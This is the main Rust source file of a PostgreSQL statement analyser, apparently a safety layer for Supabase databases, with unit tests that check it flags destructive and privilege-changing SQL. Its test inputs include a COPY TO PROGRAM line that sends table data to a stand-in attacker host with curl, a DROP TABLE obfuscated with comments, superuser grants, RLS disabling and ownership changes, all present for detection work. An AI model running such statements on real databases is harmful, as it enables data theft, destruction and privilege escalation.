//! # supasafe-parser
//!
//! Semantic analysis of PostgreSQL statements for SupaSafe.
//!
//! The rule this crate exists to enforce: **SupaSafe never decides anything by
//! matching text.** Every verdict is derived from a parsed syntax tree, or, for
//! the handful of statements the grammar cannot represent, from a token stream
//! produced by a tokeniser that understands quoting, dollar quoting and
//! comments.
//!
//! That distinction is the whole product. A rule that looks for the string
//! `DROP TABLE` is defeated by `drop/**/table`, by `DROP TABLE` inside a
//! `DO $$ ... $$` body, by a comment containing the words, and by a string
//! literal that merely mentions them. A rule that looks at the AST is not.
//!
//! ## Example
//!
//! ```
//! use supasafe_parser::{analyze, StatementKind};
//!
//! let batch = analyze("DELETE FROM users WHERE 1=1");
//! let stmt = &batch.statements[0];
//!
//! assert_eq!(stmt.kind, StatementKind::Delete);
//! // The WHERE clause is present, but it is a tautology.
//! assert!(stmt.predicate.present);
//! assert!(stmt.predicate.always_true);
//! assert!(stmt.is_unfiltered_write());
//! ```

#![forbid(unsafe_code)]
#![warn(missing_debug_implementations)]

mod analyze;
pub mod fallback;
pub mod kind;
pub mod lexer;
pub mod normalize;
pub mod objects;
pub mod predicate;
pub mod statement;

pub use analyze::{analyze, analyze_statement};
pub use kind::{Category, StatementKind};
pub use lexer::split_statements;
pub use normalize::{normalize, summarize};
pub use objects::{Access, ManagedSurface, ObjectKind, ObjectRef};
pub use predicate::{PredicateAnalysis, Selectivity};
pub use statement::{Batch, Flags, StatementAnalysis};

#[cfg(test)]
mod tests {
    use super::*;

    fn one(sql: &str) -> StatementAnalysis {
        let b = analyze(sql);
        assert_eq!(b.statements.len(), 1, "expected one statement from: {sql}");
        b.statements.into_iter().next().unwrap()
    }

    #[test]
    fn select_is_a_read() {
        let s = one("SELECT id, email FROM public.users WHERE id = 1");
        assert_eq!(s.kind, StatementKind::Select);
        assert_eq!(s.category(), Category::Read);
        assert_eq!(s.objects.len(), 1);
        assert_eq!(s.objects[0].qualified(), "public.users");
        assert_eq!(s.objects[0].access, Access::Read);
        assert!(s.mutated_objects().is_empty());
    }

    #[test]
    fn insert_is_a_write() {
        let s = one("INSERT INTO orders (id, total) VALUES (1, 2)");
        assert_eq!(s.kind, StatementKind::Insert);
        assert_eq!(s.objects[0].access, Access::Insert);
    }

    #[test]
    fn insert_from_select_records_both_tables() {
        let s = one("INSERT INTO archive SELECT * FROM orders");
        let names: Vec<_> = s.objects.iter().map(|o| o.qualified()).collect();
        assert!(names.contains(&"public.archive".to_string()));
        assert!(names.contains(&"public.orders".to_string()));
    }

    #[test]
    fn update_without_where_is_unfiltered() {
        let s = one("UPDATE users SET is_admin = true");
        assert_eq!(s.kind, StatementKind::Update);
        assert!(s.is_unfiltered_write());
        assert_eq!(s.selectivity(), Selectivity::Unbounded);
    }

    #[test]
    fn update_with_key_where_is_not_unfiltered() {
        let s = one("UPDATE users SET email = $1 WHERE id = $2");
        assert!(!s.is_unfiltered_write());
        assert_eq!(s.selectivity(), Selectivity::SingleRow);
    }

    #[test]
    fn delete_without_where_is_unfiltered() {
        let s = one("DELETE FROM users");
        assert!(s.is_unfiltered_write());
        assert!(s.is_data_destructive());
        assert_eq!(s.destroyed_objects().len(), 1);
    }

    #[test]
    fn tautological_delete_is_unfiltered() {
        let s = one("DELETE FROM users WHERE 1=1");
        assert!(s.predicate.present);
        assert!(s.is_unfiltered_write());
    }

    #[test]
    fn truncate_is_recognised() {
        let s = one("TRUNCATE TABLE public.events CASCADE");
        assert_eq!(s.kind, StatementKind::Truncate);
        assert!(s.flags.cascade);
        assert_eq!(s.objects[0].access, Access::Truncate);
    }

    #[test]
    fn drop_table_is_recognised() {
        let s = one("DROP TABLE IF EXISTS public.users CASCADE");
        assert_eq!(s.kind, StatementKind::DropTable);
        assert!(s.flags.cascade);
        assert!(s.flags.if_exists);
        assert!(s.is_data_destructive());
    }

    #[test]
    fn drop_schema_names_the_schema() {
        let s = one("DROP SCHEMA auth CASCADE");
        assert_eq!(s.kind, StatementKind::DropSchema);
        assert_eq!(s.objects[0].surface, ManagedSurface::SupabaseAuth);
        assert!(s.objects[0].is_protected());
    }

    #[test]
    fn supabase_auth_tables_are_recognised() {
        let s = one("DELETE FROM auth.users");
        assert_eq!(s.objects[0].surface, ManagedSurface::SupabaseAuth);
        assert_eq!(s.protected_objects().len(), 1);
    }

    #[test]
    fn alter_table_drop_column_is_flagged() {
        let s = one("ALTER TABLE public.users DROP COLUMN email");
        assert_eq!(s.kind, StatementKind::AlterTable);
        assert!(s.flags.drops_column);
        assert!(s.is_data_destructive());
    }

    #[test]
    fn disabling_rls_is_flagged() {
        let s = one("ALTER TABLE public.profiles DISABLE ROW LEVEL SECURITY");
        assert!(s.flags.weakens_rls);
    }

    #[test]
    fn dropping_a_policy_weakens_rls() {
        let s = one("DROP POLICY tenant_isolation ON public.documents");
        assert_eq!(s.kind, StatementKind::DropPolicy);
        assert!(s.flags.weakens_rls);
    }

    #[test]
    fn owner_changes_are_flagged() {
        let s = one("ALTER TABLE public.users OWNER TO attacker");
        assert!(s.flags.changes_owner);
    }

    #[test]
    fn superuser_grants_are_flagged() {
        let s = one("ALTER ROLE app_user WITH SUPERUSER");
        assert_eq!(s.kind, StatementKind::AlterRole);
        assert!(s.flags.grants_elevated_role);
    }

    #[test]
    fn grant_all_to_public_is_flagged() {
        let s = one("GRANT ALL ON ALL TABLES IN SCHEMA public TO anon");
        assert_eq!(s.kind, StatementKind::Grant);
        assert!(s.flags.grants_all);
        assert!(s.flags.grants_to_public);
    }

    #[test]
    fn copy_to_program_is_flagged() {
        let s = one("COPY users TO PROGRAM 'curl -X POST http://evil.example'");
        assert!(s.flags.copy_program);
    }

    #[test]
    fn security_definer_functions_are_flagged() {
        let s = one(
            "CREATE FUNCTION escalate() RETURNS void LANGUAGE sql SECURITY DEFINER AS $$ \
             DELETE FROM users $$",
        );
        assert!(s.flags.security_definer);
        assert!(s.flags.opaque_body_is_destructive);
    }

    #[test]
    fn do_blocks_fall_back_to_lexical_classification() {
        let s = one("DO $$ BEGIN TRUNCATE TABLE public.events; END $$");
        assert_eq!(s.kind, StatementKind::DoBlock);
        assert!(!s.parsed);
        assert!(s.flags.opaque_body_is_destructive);
    }

    #[test]
    fn a_batch_is_analysed_statement_by_statement() {
        let b = analyze("SELECT 1; DROP TABLE users; INSERT INTO t VALUES (1)");
        assert_eq!(b.statements.len(), 3);
        assert_eq!(b.statements[1].kind, StatementKind::DropTable);
        assert!(b.contains_destructive());
        assert_eq!(b.dominant().unwrap().kind, StatementKind::DropTable);
    }

    #[test]
    fn a_drop_hidden_behind_an_unparseable_statement_is_still_seen() {
        // The first fragment does not parse; the DROP after it must still be
        // analysed rather than swallowed with the whole batch.
        let b = analyze("REINDEX TABLE orders; DROP TABLE public.users");
        assert_eq!(b.statements.len(), 2);
        assert_eq!(b.statements[1].kind, StatementKind::DropTable);
    }

    #[test]
    fn comments_cannot_hide_a_drop() {
        let s = one("DROP/**/TABLE/**/public.users");
        assert_eq!(s.kind, StatementKind::DropTable);
        assert_eq!(s.objects[0].qualified(), "public.users");
    }

    #[test]
    fn a_string_mentioning_drop_table_is_not_a_drop() {
        let s = one("INSERT INTO audit_log (message) VALUES ('DROP TABLE users')");
        assert_eq!(s.kind, StatementKind::Insert);
        assert!(!s.is_data_destructive());
    }

    #[test]
    fn quoted_identifiers_are_preserved() {
        let s = one(r#"DROP TABLE "public"."Weird Name""#);
        assert_eq!(s.objects[0].name, "Weird Name");
    }

    #[test]
    fn normalization_strips_literals() {
        let s = one("SELECT * FROM users WHERE token = 'sk-live-secret'");
        assert!(!s.normalized.contains("sk-live-secret"));
    }

    #[test]
    fn delete_with_subquery_reports_both_tables() {
        let s = one("DELETE FROM users WHERE id IN (SELECT user_id FROM banned)");
        let names: Vec<_> = s.objects.iter().map(|o| o.qualified()).collect();
        assert!(names.contains(&"public.users".to_string()));
        assert!(names.contains(&"public.banned".to_string()));
    }

    #[test]
    fn explain_does_not_inherit_write_access() {
        let s = one("EXPLAIN DELETE FROM users");
        assert_eq!(s.kind, StatementKind::Explain);
        assert!(s.objects.iter().all(|o| o.access == Access::Read));
    }

    #[test]
    fn transactions_are_recognised() {
        let b = analyze("BEGIN; DELETE FROM users; COMMIT");
        assert!(b.explicit_transaction);
        assert_eq!(b.statements[0].kind, StatementKind::Begin);
        assert_eq!(b.statements[2].kind, StatementKind::Commit);
    }

    #[test]
    fn merge_with_delete_branch_is_destructive() {
        let s = one("MERGE INTO target t USING source s ON t.id = s.id \
             WHEN MATCHED THEN DELETE");
        assert_eq!(s.kind, StatementKind::Merge);
        assert!(s.objects.iter().any(|o| o.access == Access::Delete));
    }

    #[test]
    fn create_index_without_concurrently_is_noted() {
        let s = one("CREATE INDEX idx ON public.orders (user_id)");
        assert!(!s.flags.concurrently);
        assert!(!s.notes.is_empty());
    }
}
